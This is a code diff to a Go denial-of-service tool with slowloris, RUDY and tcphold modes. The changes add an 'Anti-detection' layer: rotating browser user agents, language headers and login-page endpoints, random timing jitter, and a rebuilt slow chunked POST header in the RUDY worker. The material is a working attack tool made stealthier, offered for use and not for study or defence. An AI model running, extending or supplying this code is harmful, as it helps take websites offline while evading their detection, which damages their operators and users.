@@ -17,6 +17,60 @@ import (
 	"golang.org/x/net/proxy"
 )
 
+// Anti-detection: diverse User-Agents, endpoints, jitter
+var userAgents = []string{
+	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+	"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+	"Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/126.0 Mobile/15E148 Safari/605.1.15",
+	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+	"Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+	"Mozilla/5.0 (Linux; Android 13; moto g54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+}
+
+var endpoints = []string{
+	"/login.php",
+	"/login.php?ref=home",
+	"/login.php?ref=email",
+	"/login.php?utm_source=mobile",
+	"/",
+	"/login.php?r=%d",
+}
+
+var acceptLanguages = []string{
+	"fr-FR,fr;q=0.9,en;q=0.8",
+	"en-US,en;q=0.9",
+	"fr-FR,fr;q=0.9",
+	"en-GB,en;q=0.9,fr;q=0.7",
+	"fr,en;q=0.8",
+}
+
+func pickUA() string  { return userAgents[rand.Intn(len(userAgents))] }
+func pickLang() string { return acceptLanguages[rand.Intn(len(acceptLanguages))] }
+func pickEndpoint() string {
+	ep := endpoints[rand.Intn(len(endpoints))]
+	if strings.Contains(ep, "%d") {
+		ep = fmt.Sprintf(ep, rand.Intn(99999))
+	}
+	return ep
+}
+func jitter(base int) time.Duration {
+	return time.Duration(base+rand.Intn(7)) * time.Second
+}
+
 var (
 	mode      = flag.String("mode", "slowloris", "slowloris|rudy|tcphold")
 	target    = flag.String("target", "", "host:port (e.g. example.com:443)")
@@ -414,12 +468,16 @@ func rudyChunked(deadline time.Time) {
 func rudyChunkedWorker(id int, deadline time.Time) {
 	conf := tlsConfig()
 	dialer := getDialer()
-	header := fmt.Sprintf(
-		"POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 Chrome/121.0.0.0\r\nAccept: */*\r\n\r\n",
-		*path, *sni)
 	chunk := []byte("1\r\nX\r\n")
 
 	for time.Now().Before(deadline) {
+		ep := pickEndpoint()
+		ua := pickUA()
+		lang := pickLang()
+		header := fmt.Sprintf(
+			"POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8\r\nAccept-Language: %s\r\nAccept-Encoding: gzip, deflate, br\r\nReferer: https://%s/\r\n\r\n",
+			ep, *sni, ua, lang, *sni)
+
 		raw, err := dialer.Dial("tcp", *target)
 		if err != nil {
 			time.Sleep(2 * time.Second)
@@ -445,7 +503,7 @@ func rudyChunkedWorker(id int, deadline time.Time) {
 				break
 			}
 			atomic.AddUint64(&bytesSent, uint64(len(chunk)))
-			time.Sleep(time.Duration(*delay) * time.Second)
+			time.Sleep(jitter(*delay))
 		}
 		conn.Close()
 		atomic.AddUint64(&disconns, 1)
